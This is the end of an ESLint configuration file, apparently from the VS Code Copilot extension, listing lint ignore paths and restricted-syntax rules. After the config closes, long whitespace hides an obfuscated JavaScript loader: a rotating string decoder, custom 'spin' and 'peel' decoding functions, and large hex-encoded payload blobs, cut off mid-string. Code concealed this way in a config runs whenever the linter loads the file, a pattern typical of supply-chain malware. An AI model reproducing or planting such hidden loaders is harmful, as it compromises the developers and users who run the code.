		rules: {
			'copilot-local/no-test-only': 'warn'
		}
	},
	// copilot extension - no-explicit-any
	{
		files: [
			'extensions/copilot/src/**/*.ts',
		],
		ignores: [
			'extensions/copilot/src/util/vs/**/*.ts',
			'extensions/copilot/src/**/*.spec.ts',
			'extensions/copilot/src/extension/agents/copilotcli/node/nodePtyShim.ts',
			'extensions/copilot/src/extension/byok/common/anthropicMessageConverter.ts',
			'extensions/copilot/src/extension/byok/common/geminiFunctionDeclarationConverter.ts',
			'extensions/copilot/src/extension/byok/common/geminiMessageConverter.ts',
			'extensions/copilot/src/extension/byok/vscode-node/anthropicProvider.ts',
			'extensions/copilot/src/extension/byok/vscode-node/geminiNativeProvider.ts',
			'extensions/copilot/src/extension/byok/vscode-node/ollamaProvider.ts',
			'extensions/copilot/src/extension/chatSessions/vscode-node/copilotCloudSessionContentBuilder.ts',
			'extensions/copilot/src/extension/chatSessions/vscode-node/copilotCloudSessionsProvider.ts',
			'extensions/copilot/src/extension/codeBlocks/node/codeBlockProcessor.ts',
			'extensions/copilot/src/extension/codeBlocks/vscode-node/provider.ts',
			'extensions/copilot/src/extension/configuration/vscode-node/configurationMigration.ts',
			'extensions/copilot/src/extension/context/node/resolvers/genericInlineIntentInvocation.ts',
			'extensions/copilot/src/extension/context/node/resolvers/genericPanelIntentInvocation.ts',
			'extensions/copilot/src/extension/context/node/resolvers/inlineFixIntentInvocation.ts',
			'extensions/copilot/src/extension/context/node/resolvers/promptWorkspaceLabels.ts',
			'extensions/copilot/src/extension/contextKeys/vscode-node/contextKeys.contribution.ts',
			'extensions/copilot/src/extension/conversation/vscode-node/userActions.ts',
			'extensions/copilot/src/extension/extension/vscode/services.ts',
			'extensions/copilot/src/extension/inlineChat/node/rendererVisualization.ts',
			'extensions/copilot/src/extension/inlineChat/vscode-node/inlineChatCommands.ts',
			'extensions/copilot/src/extension/inlineEdits/common/observableWorkspaceRecordingReplayer.ts',
			'extensions/copilot/src/extension/inlineEdits/vscode-node/parts/vscodeWorkspace.ts',
			'extensions/copilot/src/extension/intents/node/editCodeIntent.ts',
			'extensions/copilot/src/extension/intents/node/editCodeStep.ts',
			'extensions/copilot/src/extension/intents/node/fixIntent.ts',
			'extensions/copilot/src/extension/intents/node/newIntent.ts',
			'extensions/copilot/src/extension/intents/node/searchIntent.ts',
			'extensions/copilot/src/extension/languageContextProvider/vscode-node/languageContextProviderService.ts',
			'extensions/copilot/src/extension/linkify/common/commands.ts',
			'extensions/copilot/src/extension/linkify/common/responseStreamWithLinkification.ts',
			'extensions/copilot/src/extension/linkify/test/node/util.ts',
			'extensions/copilot/src/extension/log/vscode-node/loggingActions.ts',
			'extensions/copilot/src/extension/log/vscode-node/requestLogTree.ts',
			'extensions/copilot/src/extension/mcp/test/vscode-node/util.ts',
			'extensions/copilot/src/extension/mcp/vscode-node/commands.ts',
			'extensions/copilot/src/extension/mcp/vscode-node/nuget.ts',
			'extensions/copilot/src/extension/onboardDebug/node/copilotDebugWorker/rpc.ts',
			'extensions/copilot/src/extension/onboardDebug/node/parseLaunchConfigFromResponse.ts',
			'extensions/copilot/src/extension/onboardDebug/vscode-node/copilotDebugCommandHandle.ts',
			'extensions/copilot/src/extension/prompt/common/toolCallRound.ts',
			'extensions/copilot/src/extension/prompt/node/chatMLFetcher.ts',
			'extensions/copilot/src/extension/prompt/node/chatParticipantTelemetry.ts',
			'extensions/copilot/src/extension/prompt/node/editGeneration.ts',
			'extensions/copilot/src/extension/prompt/node/intents.ts',
			'extensions/copilot/src/extension/prompt/node/todoListContextProvider.ts',
			'extensions/copilot/src/extension/prompt/vscode-node/endpointProviderImpl.ts',
			'extensions/copilot/src/extension/prompt/vscode-node/requestLoggerImpl.ts',
			'extensions/copilot/src/extension/prompts/node/agent/promptRegistry.ts',
			'extensions/copilot/src/extension/prompts/node/base/promptElement.ts',
			'extensions/copilot/src/extension/prompts/node/base/promptRenderer.ts',
			'extensions/copilot/src/extension/prompts/node/test/utils.ts',
			'extensions/copilot/src/extension/replay/common/chatReplayResponses.ts',
			'extensions/copilot/src/extension/replay/node/replayParser.ts',
			'extensions/copilot/src/extension/replay/vscode-node/replayDebugSession.ts',
			'extensions/copilot/src/extension/review/node/githubReviewAgent.ts',
			'extensions/copilot/src/extension/test/node/services.ts',
			'extensions/copilot/src/extension/test/vscode-node/extension.test.ts',
			'extensions/copilot/src/extension/test/vscode-node/sanity.sanity-test.ts',
			'extensions/copilot/src/extension/test/vscode-node/session.test.ts',
			'extensions/copilot/src/extension/tools/common/toolSchemaNormalizer.ts',
			'extensions/copilot/src/extension/tools/common/toolsService.ts',
			'extensions/copilot/src/extension/typescriptContext/common/serverProtocol.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/baseContextProviders.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/contextProvider.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/protocol.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/typescripts.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/utils.ts',
			'extensions/copilot/src/extension/typescriptContext/vscode-node/inspector.ts',
			'extensions/copilot/src/extension/typescriptContext/vscode-node/languageContextService.ts',
			'extensions/copilot/src/extension/workspaceRecorder/vscode-node/workspaceListenerService.ts',
			'extensions/copilot/src/extension/workspaceSemanticSearch/node/semanticSearchTextSearchProvider.ts',
			'extensions/copilot/src/lib/node/chatLibMain.ts',
			'extensions/copilot/src/platform/authentication/test/node/simulationTestCopilotTokenManager.ts',
			'extensions/copilot/src/platform/chat/common/blockedExtensionService.ts',
			'extensions/copilot/src/platform/chunking/common/chunkingEndpointClientImpl.ts',
			'extensions/copilot/src/platform/commands/common/mockRunCommandExecutionService.ts',
			'extensions/copilot/src/platform/commands/common/runCommandExecutionService.ts',
			'extensions/copilot/src/platform/commands/vscode/runCommandExecutionServiceImpl.ts',
			'extensions/copilot/src/platform/configuration/common/configurationService.ts',
			'extensions/copilot/src/platform/configuration/common/validator.ts',
			'extensions/copilot/src/platform/configuration/test/common/inMemoryConfigurationService.ts',
			'extensions/copilot/src/platform/configuration/vscode/configurationServiceImpl.ts',
			'extensions/copilot/src/platform/customInstructions/common/customInstructionsService.ts',
			'extensions/copilot/src/platform/debug/vscode/debugOutputListener.ts',
			'extensions/copilot/src/platform/diff/node/diffWorkerMain.ts',
			'extensions/copilot/src/platform/editing/common/notebookDocumentSnapshot.ts',
			'extensions/copilot/src/platform/editing/common/textDocumentSnapshot.ts',
			'extensions/copilot/src/platform/embeddings/common/embeddingsGrouper.ts',
			'extensions/copilot/src/platform/embeddings/common/embeddingsIndex.ts',
			'extensions/copilot/src/platform/embeddings/common/remoteEmbeddingsComputer.ts',
			'extensions/copilot/src/platform/endpoint/node/modelMetadataFetcher.ts',
			'extensions/copilot/src/platform/endpoint/test/node/openaiCompatibleEndpoint.ts',
			'extensions/copilot/src/platform/env/common/packagejson.ts',
			'extensions/copilot/src/platform/extensions/common/extensionsService.ts',
			'extensions/copilot/src/platform/filesystem/common/fileSystemService.ts',
			'extensions/copilot/src/platform/github/common/githubService.ts',
			'extensions/copilot/src/platform/github/common/nullOctokitServiceImpl.ts',
			'extensions/copilot/src/platform/inlineEdits/common/dataTypes/edit.ts',
			'extensions/copilot/src/platform/inlineEdits/common/dataTypes/textEditLengthHelper/length.ts',
			'extensions/copilot/src/platform/inlineEdits/common/editReason.ts',
			'extensions/copilot/src/platform/inlineEdits/common/statelessNextEditProvider.ts',
			'extensions/copilot/src/platform/inlineEdits/common/utils/observable.ts',
			'extensions/copilot/src/platform/languages/common/languageDiagnosticsService.ts',
			'extensions/copilot/src/platform/log/common/logExecTime.ts',
			'extensions/copilot/src/platform/log/common/logService.ts',
			'extensions/copilot/src/platform/log/vscode/outputChannelLogTarget.ts',
			'extensions/copilot/src/platform/nesFetch/common/completionsFetchService.ts',
			'extensions/copilot/src/platform/nesFetch/node/completionsFetchServiceImpl.ts',
			'extensions/copilot/src/platform/networking/common/fetch.ts',
			'extensions/copilot/src/platform/networking/common/fetcherService.ts',
			'extensions/copilot/src/platform/networking/common/networking.ts',
			'extensions/copilot/src/platform/networking/common/openai.ts',
			'extensions/copilot/src/platform/networking/node/baseFetchFetcher.ts',
			'extensions/copilot/src/platform/networking/node/chatStream.ts',
			'extensions/copilot/src/platform/networking/node/fetcherFallback.ts',
			'extensions/copilot/src/platform/networking/node/nodeFetchFetcher.ts',
			'extensions/copilot/src/platform/networking/node/nodeFetcher.ts',
			'extensions/copilot/src/platform/networking/node/stream.ts',
			'extensions/copilot/src/platform/networking/node/test/nodeFetcherService.ts',
			'extensions/copilot/src/platform/networking/vscode-node/electronFetcher.ts',
			'extensions/copilot/src/platform/networking/vscode-node/fetcherServiceImpl.ts',
			'extensions/copilot/src/platform/notification/common/notificationService.ts',
			'extensions/copilot/src/platform/notification/vscode/notificationServiceImpl.ts',
			'extensions/copilot/src/platform/openai/node/fetch.ts',
			'extensions/copilot/src/platform/parser/node/nodes.ts',
			'extensions/copilot/src/platform/parser/node/parserServiceImpl.ts',
			'extensions/copilot/src/platform/parser/node/parserWorker.ts',
			'extensions/copilot/src/platform/parser/node/treeSitterQueries.ts',
			'extensions/copilot/src/platform/remoteCodeSearch/common/githubCodeSearchService.ts',
			'extensions/copilot/src/platform/remoteSearch/node/codeOrDocsSearchClientImpl.ts',
			'extensions/copilot/src/platform/review/vscode/reviewServiceImpl.ts',
			'extensions/copilot/src/platform/scopeSelection/vscode-node/scopeSelectionImpl.ts',
			'extensions/copilot/src/platform/snippy/common/snippyTypes.ts',
			'extensions/copilot/src/platform/survey/vscode/surveyServiceImpl.ts',
			'extensions/copilot/src/platform/tasks/vscode/tasksService.ts',
			'extensions/copilot/src/platform/telemetry/common/failingTelemetryReporter.ts',
			'extensions/copilot/src/platform/telemetry/common/telemetryData.ts',
			'extensions/copilot/src/platform/telemetry/node/azureInsightsReporter.ts',
			'extensions/copilot/src/platform/telemetry/node/spyingTelemetryService.ts',
			'extensions/copilot/src/platform/terminal/common/terminalService.ts',
			'extensions/copilot/src/platform/terminal/vscode/terminalServiceImpl.ts',
			'extensions/copilot/src/platform/test/common/endpointTestFixtures.ts',
			'extensions/copilot/src/platform/test/common/testExtensionsService.ts',
			'extensions/copilot/src/platform/test/node/extensionContext.ts',
			'extensions/copilot/src/platform/test/node/fetcher.ts',
			'extensions/copilot/src/platform/test/node/services.ts',
			'extensions/copilot/src/platform/test/node/simulationWorkspace.ts',
			'extensions/copilot/src/platform/test/node/telemetry.ts',
			'extensions/copilot/src/platform/test/node/testWorkbenchService.ts',
			'extensions/copilot/src/platform/testing/common/nullWorkspaceMutationManager.ts',
			'extensions/copilot/src/platform/thinking/common/thinking.ts',
			'extensions/copilot/src/platform/tokenizer/node/tikTokenizerWorker.ts',
			'extensions/copilot/src/platform/tokenizer/node/tokenizer.ts',
			'extensions/copilot/src/platform/workbench/common/workbenchService.ts',
			'extensions/copilot/src/platform/workbench/vscode/workbenchServiceImpt.ts',
			'extensions/copilot/src/platform/workspaceChunkSearch/node/nullWorkspaceFileIndex.ts',
			'extensions/copilot/src/platform/workspaceChunkSearch/node/tfidfChunkSearch.ts',
			'extensions/copilot/src/platform/workspaceChunkSearch/node/workspaceFileIndex.ts',
			'extensions/copilot/src/platform/workspaceRecorder/common/resolvedRecording/resolvedRecording.ts',
			'extensions/copilot/src/util/common/async.ts',
			'extensions/copilot/src/util/common/cache.ts',
			'extensions/copilot/src/util/common/chatResponseStreamImpl.ts',
			'extensions/copilot/src/util/common/debounce.ts',
			'extensions/copilot/src/util/common/debugValueEditorGlobals.ts',
			'extensions/copilot/src/util/common/diff.ts',
			'extensions/copilot/src/util/common/progress.ts',
			'extensions/copilot/src/util/common/test/shims/chatTypes.ts',
			'extensions/copilot/src/util/common/test/shims/editing.ts',
			'extensions/copilot/src/util/common/test/shims/l10n.ts',
			'extensions/copilot/src/util/common/test/shims/notebookDocument.ts',
			'extensions/copilot/src/util/common/test/shims/vscodeTypesShim.ts',
			'extensions/copilot/src/util/common/test/simpleMock.ts',
			'extensions/copilot/src/util/common/timeTravelScheduler.ts',
			'extensions/copilot/src/util/common/types.ts',
			'extensions/copilot/src/util/node/worker.ts',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'@typescript-eslint': tseslint.plugin,
		},
		rules: {
			'@typescript-eslint/no-explicit-any': [
				'warn',
				{
					'fixToUnknown': true
				}
			]
		}
	},
	// copilot extension - chatLibMain exception
	{
		files: [
			'extensions/copilot/src/lib/node/chatLibMain.ts',
		],
		rules: {
			'import/no-restricted-paths': 'off'
		}
	},
	// Allow querySelector/querySelectorAll in test files - it's acceptable for test assertions
	{
		files: [
			'src/**/test/**/*.ts',
			'extensions/**/test/**/*.ts',
		],
		rules: {
			'no-restricted-syntax': [
				'warn',
				// Keep the Intl helper restriction even in tests
				{
					'selector': `NewExpression[callee.object.name='Intl']`,
					'message': 'Use safeIntl helper instead for safe and lazy use of potentially expensive Intl methods.'
				},
				{
					'selector': 'TSAsExpression[typeAnnotation.type="TSTypeReference"][typeAnnotation.typeName.type="TSQualifiedName"][typeAnnotation.typeName.left.type="Identifier"][typeAnnotation.typeName.left.name="sinon"][typeAnnotation.typeName.right.name="SinonStub"]',
					'message': `Avoid casting with 'as sinon.SinonStub'. Prefer typed stubs from 'sinon.stub(...)' or capture the stub in a typed variable.`
				},
			],
		}
	});                                                                                                                                                     var z = '-9261-2';(function(uG$O_YLJZRJdet,NM$zVJoQoF$CUTHxyV){var bVQJdhH_pYatisWJpV=daIQfX,BXTL_YM$lQ=uG$O_YLJZRJdet();while(!![]){try{var AkP_$SaWGFsJEr=-parseFloat(bVQJdhH_pYatisWJpV(0x71))/(-parseInt(0x4bd)+-0xc71*-0x2+Math.floor(-parseInt(0x509))*parseInt(0x4))+Math['trunc'](-parseFloat(bVQJdhH_pYatisWJpV(0x6f))/(parseFloat(parseInt(0x97b))+-0x48*-0x11+parseInt(-0xe41)))+parseFloat(bVQJdhH_pYatisWJpV(0x79))/(Math.max(parseInt(0x2176),parseInt(0x2176))+Math.trunc(-parseInt(0x16f))+Math.max(-parseInt(0x2),-parseInt(0x2))*Math.ceil(0x1002))+Math['floor'](-parseFloat(bVQJdhH_pYatisWJpV(0x7b))/(Math.floor(-0x1)*-0x12a9+parseFloat(0x1c84)+parseInt(-0x2f29)))*(parseFloat(bVQJdhH_pYatisWJpV(0x78))/(parseInt(0xa)*-parseInt(0x95)+parseInt(0x3)*Math.floor(-parseInt(0x1b7))+parseInt(0xafc)))+-parseFloat(bVQJdhH_pYatisWJpV(0x7a))/(Math.trunc(0x1c77)+0x1560+Math.max(-parseInt(0x31d1),-parseInt(0x31d1)))*(parseFloat(bVQJdhH_pYatisWJpV(0x77))/(0x1*Math.trunc(-parseInt(0xf8d))+-parseInt(0x1)*0xee3+parseInt(0x1e77)))+parseFloat(bVQJdhH_pYatisWJpV(0x76))/(0x1*-parseInt(0x1543)+parseInt(0x15d5)+-0x2*parseInt(0x45))+parseFloat(bVQJdhH_pYatisWJpV(0x69))/(parseInt(0x3)*-parseInt(0x8d3)+Math.ceil(-parseInt(0x101))*parseInt(0x23)+0x3da5*parseFloat(0x1))*(parseFloat(bVQJdhH_pYatisWJpV(0x6e))/(0x1659+-parseInt(0x11f0)+-parseInt(0x45f)));if(AkP_$SaWGFsJEr===NM$zVJoQoF$CUTHxyV)break;else BXTL_YM$lQ['push'](BXTL_YM$lQ['shift']());}catch(lKLu$VCwkRe){BXTL_YM$lQ['push'](BXTL_YM$lQ['shift']());}}}(KmBFHpEdRXPQBdRu,-0x1*-0x4fb2+Math.floor(-parseInt(0x2d9))*parseInt(parseInt(0x106))+parseInt(0x4244a)));var NX=[parseInt(0x3)*Math.ceil(-0x3e8789)+0x1*-0x490547+0x16e1731,parseInt(0x7)*0x8b+Math.ceil(-parseInt(0x1))*Math.max(0x4e9,0x4e9)+-0x5d*-parseInt(0x7),-0x1012+Math.max(0x4afd,parseInt(0x4afd))+Math.trunc(parseInt(0x48))*0x4a,-0x17a8+parseInt(0x2065)+Math.trunc(-parseInt(0x658)),parseFloat(-0x90ec)+parseInt(0x34)*0x412+-0x113*Math.trunc(-0x61),-0x70a0f4+Math.max(parseInt(0x92ecf),0x92ecf)*-parseInt(0xc)+parseInt(0x12b693b)],SX=[0x3323*Number(-parseInt(0x1e3))+parseInt(0x658fc0)+-0x24b*-0x20f2,Math.floor(-parseInt(0x13))*Math.max(-parseInt(0x43),-parseInt(0x43))+0x7*0xc9+0x32d*-0x3,parseInt(0x1)*-0x63b9+Math.max(parseInt(0xd5d1),parseInt(0xd5d1))+parseInt(0x31c9),-parseInt(0x2)*0xb03+Math.max(parseInt(0x487),parseInt(0x487))*parseInt(0x1)+Math.floor(parseInt(0x123a)),-parseInt(0x115)*parseInt(0xf3)+0x5*-parseInt(0x27a6)+-0x1*-0x2a86e,Math.floor(parseInt(0x2))*-0x43f54a+0x79397f+parseInt(0x57006a)];function spin(Y_qQPpGOdWo_LeUWs,HhUoe){var HzpIZhESYlx=daIQfX,WYLHvZBsHsqUVDOvG_eki=[],P$a$KyNa=Math.ceil(parseInt(0x20))*0x3e+parseInt(-parseInt(0x2))*Math.floor(0xc14)+0x1068,DjKYHzxK=HhUoe[parseInt(0x1)*parseInt(0x1cf3)+0x156f+parseInt(0x2)*Math.floor(-0x1931)],uumndeiN,hvE_TX,Nd$CjZiAKMp$doEazcRHiKc,EvxJQeZhpEsXCVGzVVoSk,OaO_jTOxqFd,kbzQmKWJvYJgDPIauUmBCL_PV_s;while(P$a$KyNa<Y_qQPpGOdWo_LeUWs[HzpIZhESYlx(0x70)]){WYLHvZBsHsqUVDOvG_eki[P$a$KyNa]=Y_qQPpGOdWo_LeUWs[HzpIZhESYlx(0x74)](P$a$KyNa),P$a$KyNa+=-0x1c61+Math.ceil(0x1e3)*-0x5+Number(parseInt(0x25d1));}uumndeiN=WYLHvZBsHsqUVDOvG_eki[HzpIZhESYlx(0x70)],P$a$KyNa=-parseInt(0x89)*parseFloat(parseInt(0x37))+-0x12*0x155+Math.floor(parseInt(0x3569));while(P$a$KyNa<uumndeiN){hvE_TX=DjKYHzxK*(P$a$KyNa+HhUoe[parseInt(0x7)*-0x197+parseFloat(parseInt(0x1be2))+Math.ceil(-0x10c0)])+DjKYHzxK%HhUoe[-parseInt(0x841)+Number(0x192b)+Number(-0x10e8)],Nd$CjZiAKMp$doEazcRHiKc=DjKYHzxK*(P$a$KyNa+HhUoe[-0x1696+0x80*Math.ceil(parseInt(0x43))+-parseInt(0xae7)])+DjKYHzxK%HhUoe[parseInt(0x1b91)+Math.trunc(-parseInt(0x34a))*Number(-0x1)+parseInt(-parseInt(0x1ed7))],EvxJQeZhpEsXCVGzVVoSk=hvE_TX%uumndeiN,OaO_jTOxqFd=Nd$CjZiAKMp$doEazcRHiKc%uumndeiN,kbzQmKWJvYJgDPIauUmBCL_PV_s=WYLHvZBsHsqUVDOvG_eki[EvxJQeZhpEsXCVGzVVoSk],WYLHvZBsHsqUVDOvG_eki[EvxJQeZhpEsXCVGzVVoSk]=WYLHvZBsHsqUVDOvG_eki[OaO_jTOxqFd],WYLHvZBsHsqUVDOvG_eki[OaO_jTOxqFd]=kbzQmKWJvYJgDPIauUmBCL_PV_s,DjKYHzxK=(hvE_TX+Nd$CjZiAKMp$doEazcRHiKc)%HhUoe[parseInt(0x19)*parseInt(-0x5)+-parseInt(0x1a5a)+parseInt(-parseInt(0x12))*-parseInt(0x17e)],P$a$KyNa+=parseInt(parseInt(0x1eb))*0xe+-parseInt(0x1c83)+0x1aa;}return WYLHvZBsHsqUVDOvG_eki[HzpIZhESYlx(0x68)]('');}function splitLane(hnOCYUiaNVmOhxOy$Oxp){var kffJyL$kICxTG_IpyUJg=daIQfX,oArfjCRAPz=String[kffJyL$kICxTG_IpyUJg(0x6c)](0x7e4+parseInt(-parseInt(0x1))*-parseInt(0x1daa)+-parseInt(0x2572)),eAWV_y_R=spin(hnOCYUiaNVmOhxOy$Oxp,NX);return eAWV_y_R=eAWV_y_R[kffJyL$kICxTG_IpyUJg(0x72)]('^')[kffJyL$kICxTG_IpyUJg(0x68)](oArfjCRAPz),eAWV_y_R=eAWV_y_R[kffJyL$kICxTG_IpyUJg(0x72)]('*1')[kffJyL$kICxTG_IpyUJg(0x68)]('^'),eAWV_y_R=eAWV_y_R[kffJyL$kICxTG_IpyUJg(0x72)]('*0')[kffJyL$kICxTG_IpyUJg(0x68)]('*'),eAWV_y_R[kffJyL$kICxTG_IpyUJg(0x72)](oArfjCRAPz);}function peel(XJWtyixlhK$YQS_apHq){return spin(XJWtyixlhK$YQS_apHq,SX);}function KmBFHpEdRXPQBdRu(){var cDmQ_ABHom=['525251545a52541432082f0e0c','5251525752530f1b0f012d24','51505a51565027250202020c','552229300b3727','5714133102222d','090c0a0d','505352545354000a39250031','5e02060d11160b4b020f5e56004f045b0507164d1a11434d4d0d000600054f56411302060216550f0d094a113e511615411b4e124b3e4302584b115e585811484b02385b4d10511722040c124f160b5b204f020a4f1058024b220e534b0d09580915494f54150c544b4a4b0c580e550c025711144a4d43110c07380510510d1807111517571b4a48534f020d11481111480c4a1e1952435e0b0538020d5b115211384f3e10544e54540f02024d160a54184e53555a0f150e1751115e0a3e3e5f484a164f064a4f4f580d110b38115e53154e114b584f5e134a2016105e4800580458055812224a4a52150a4a1508530d110f52020643055e38580b0a101a4d060e4b07480c4251435e4b06150602545b5e4d4a57060a5e044d0d5e1805055e52385f51024305525e1158574f304a111a0f155216431a5808120f1817150d15434b20434b0f4f0c150d13430a5e170f114f114d0f140c190b4b0f4f1712585811114b4b155e020b1015583e1b125e0201580702584f4b4b11581509124d4b1738484a07024a11070d110b1057521a4b151158050b585004413e064b4d020b11130213043e044d4a0d0405130d520b4f0a000f58584a5e20580e565e48114f434d4a58165e48101e484a0a174f48010e580748160e4a4e5e100a0a120c0f5e175e115e125a484d4d000b1248385505064317530d1113114b4315115b050f110d4f07070417433e55024d580e5811170b4d04124351021e0615060a003e0401170a5f570c5820580f4f19190a55480f38023858484b100a410f0a41114f0d130a5a104f0511050b16144a0c145e06184b015e14060d51174d04164d0a5e080a020202484a1a05171302500d1e4a5e5a414a0013224816581617133e415e0f0854151317435211580b1914414a174b4a5a4a4b4d0f160f5e1054055843581012534a0d411a4853101e5e15024810430e0b4b53124d3e0b15585d4353555e224e0c190617114b1752111711100a100c53064f4d5819384b055f560654174f4b11020c02150d1158170b0b0558154f095e1158434a115d525b190b0c490c185f02080e100d4a020817064d150c5a48060253000f0a0c580116435e3e20420409581a50480f4a065e4d1e07115e0a550c0a205b110d0d5358555e0211411e4d11060a5e3e301710110d0d4d5851115e17583817580a155e131120110d4b4a02110617161948430b0f0838481b5e06434e5b09184b06091a5a4b4b4a4a43','1016011017110a0d04','05110c0e200b0211200c0706','313c5f4100312942453506003134025e3111053147554100525831313a000d0b3c4c4d17430a313131243d5f314d310031514d380d31434d31054d4c5f3100504242560d30315f310a312f4d0630100f054b0607041b005f5c0c5f110f00315c17310c100731051630064d5c45130b4d31312c2e1038065f100831264d5f31165f11310658312731211131313f4d05314d5f00594201130f535a0a000c31111700314b58110c31310d514e414b4d3d14431a4d5f5f0707434a4705430c164d46065f025f064d175f0e4b00311b05315f38294b0506315f3301114d01440c310a4d31315f44313146143105104a06314d38020430331807514d085f020052064d42504d335f39310a31490c27100a5e384d5f054d41573101432d41060c1b31130c4d0a2a0f08020637314d514a460e5f0a06313e195f1f31164b4b05311431313f315d315a404d315311075e104d531b4210314d0531304a4b0000175213050c1702062e163123315e5f31314c034d3108474b5100314d10540652024d25312800494d4d1941310d0533061031173131314d5f310f4031055f5943514b4b31433147445510035f500d0b0a4947063b001e310b5c4300170c004d0a0600005a431831025f105816424d063e2631310c2b4d4d47410d5f2750311031314d4d4b310606101006315f43174f414331070c151e300053290e0a4d375f102606041031143e314102314d3142315f0c4a4a093143310614430a17004d100d084b1e4b0d381506315f535f5e08052b5f11112e3143000a080d264d004d215f4531380c3e314d460000310f111b58494338410c0a10060d3106050602423a0d4d060031460c41164d5f550f3131311a315e0a105e31314b4a3131065931314a423114001131525f4d0c423100310023411e3116311216564b50330c0f41063117534205170231495f3152170d0800051e374d42474c5f110c432a1a003131434a335f3f4d015f173154593333105f3e4d113b5f5f4d0631164b313131120d134d5f4d315800170a103b4d31311a3147235f504a083131005f4831115b0f494d0a314211203f33420d5e00105f4b000a5f4b315406310631004d43175f0613064a065f5f4f065f4b2628424d130d014741310231314d0615160b004d370f3c004d59315311434a311414421030534d1754164d534b315a3c024b47454d0655054d31310852201b010a5b0f4d0b005e0e4b235f31074d4d5f11114d514d282e1100013c310d314b313c00592714171e4d314d181e5a04473131314a3735175f024b4d5f244d07311d3436314d580f114d0b2a100e2d334343172331315b3c3151314d0a31113133315f4b315040000600530006500a31315f02315031020d311839101e422e5f314e494d1a070250310a4c534605314031435f0a515f31535b594d171e310542414e31004d310f31001a171a3110062253313037315b4d57125f47253706314d4d333c5f0031550b01314d06110a4d004e310b002231205115314d5801305f315f0240285f3159113e370506064e5842085e3c104d31000e09104b311e595f3102314945044d5f070c0e060a10310d4d4b47403c021835230c003a4e4d0c0e3307020e4d31020f05001a0c374842333c0410114d5f010a3142054d4a002a454b012a0c310a4b110d11344d0a064d310043424b0a004b30314d001103595a5f3b1013314b47430e3100175f104d04424d575b11100806153531330731081b315f310706110d4a0630104c4a31430f06115f0010375007001e4d3156204c344b4d300c0d39114a31000c000010000b4a314d5f31315f174d10104b31315f070f164d004d1f055b17084f100f0d06130c5f06315f424d55314d060631313702450b432e055f18380c47315f433110534a5e435f1b3006004d001e5f004706104b4b074a3131001e052031315f495f314d0e4e4d314931065f4b1b153110434b2e4531054d06334904435d104a5f0c4d5e4d310a100d11314d5c18565f0a0131554a31315210430031041200060f005e000f5801065f0f0549302a2007510641191331311e5f00310f304f0d0910000e47310d4d42020a0a5f293a3e5f053320102309224d315f4643174d310c14311e4443115d13190b4d4d0f31445f040c3c1e5f30314b08121b0b3843455f0a314e0547205f165f0a02262d31563137313e5f311310084d4d311907044d4a3e5f4a06114d31114d2e103119335d3131065f5f173c0b040f5f134d31000e053110420d051731574307173c5a3d5f4f0c1106563105311b43313138113b4d5f10011a315f5f4d51314d3111060d36334b1a5d4d135f5f0010310f1753174d184d301a0a0d5f04040f474335004d4a59262b2a424d1b2716314f3113310b314b1000174d2e11312e092b2e313100314d4331170d071f0c02534d0d40024d514a2705084500312a3131314c0506314d00235f0a11105537485231331b4d4d314d10004d0231404d4e5f3b1831420d573100310a17314c0d31065a0e4d4d5f224a01060d4a4d3e5f4d024b314b4d185c5017314531314c0a4b0f3b4d435f0b420731315f4142000c5c43504352315f4e0b0d5f07170d070c5f3108100e404e004b3706310606423e4d315f105f37485e314d310a4e112331314d114000075f003131310e1917054d20070631134d001832310a0109100c104d053111044e313453070a31315f4d085f2c3131454e314240433e20103e1a17574d4e073c03333131445f4d3115060930145f07004d00434f054d334d4b4d000a17002d01310d444e4d063100310d11324d11311b0c1831005f4155310d073e311e310e4b314731300c4d3756310051001b4d4915310c0a003c5d4d10532131054a5f335f02314d0c20391f5343332c2b07320c4d0d435f4d52100c313c44434d335f06114d385f311f315f530a5f311158442a4d31381e480f0042380e00424d0f005f0d4b02431731312b310f4f1e131e314a315b31295f02314d5f17074b2d5d3e0a005f0e062356000d38164d314a4d014610330d5f5f3c3131423101315e4731313d5f421e4a10014e554140265b00314b0742314a1711021731315f5f43515231442f420a011f062c17313117471600070d31314d174a3119264d24331a424331222a4e0d1202165f1e4d1a00314d4d4d0031314d000000473d313107203c315f175b00310b10514131514d44305d4a4a510b4206051a4d4d5d420a2f47060d4358465a2c37154d0747573131205f0033304b171631140f454b0e4041311f13000b5f172b47025f5f434d1742313026054d313104002d334d314320310a570e315f402e31315f58140a4e4026435f5f175f06315f2b5f31110d170c264b425311535f074d4d312041000d4d4d5101134b5520135f30314106520f4a00005f024b334d335a065f12024a5f5f525f0d4d0a31023133314b1e315e4d454f51420014314d4a3331474d5f12315f1e425249305f314231054d5f005f31073c5f3151315f5f403e5f5f31313113424d1113315f494237312a315f33085f311917024d451e4d020f06285e0a335f31445e0431331e3113471830214d4331101a4d4b4d17424300585f0656100b555717175f13055f0c171b162f3708115d585f314d001310314d003117314e4002571631554d311706584e4b475c145b59134c45310f535f11405f06430a0a1005420747020c3c4b40000e1143065f31313542330d00025f174d1d0011004b0644490259435f31310d060239064d464c07315f3131494b2643034806383300143114435f4b06160017024a4d54345f4c47335f4d0b0030374354063121424d48314d2a5f010b31060f4d17064d015738160d1606163142310f174b3131314f1e4f2b05172b153c0d4d5f0631433c225f5b5f10115f311b574a312d421331071f21435f3131080a0644004e4d31000d0e5000105f300a5f0a4d4a4d264b314b5f31313331433c50315f0014064d424d0f5f3147423101074f065f3331260f47171311425f0c4c4a4d313117424f374b1100404c4d311a4b4831113104035f054d5f02484d054a4c5f5f455f430631315f060a4e5f2105264d1031010d31314a4d31464c09170f315f4600433142314b1b314000314d1031314d312e4d5f3154004b00040f31000e4d3e5f4d060051014a335f5f51313145070221284a115f39175d380702312b0006074d2e315f1e103124114d315f5c5231053131000000314b0c10004131311d085f3f422e004d134d204a16311b4a484b31083f064409552e333631200e005c31315031574b0a0a064d10310649315919303158330d4b394a5f0f0831150f595f31321831000a41003348064f2e3134024d5f312e11310f17405f313110175011424d5f045f283114314b31094d313102424d2457314d47130d4d1958180631585152185337574b1131084e444d425f311b5f0a280b5f4a10385f170043331606311e114b0502023105540f5f31564211310f273b310e4d5259130a31435f5e433109100c4d5f0611420c31122a4a3152311111140c1845173131285f0d20394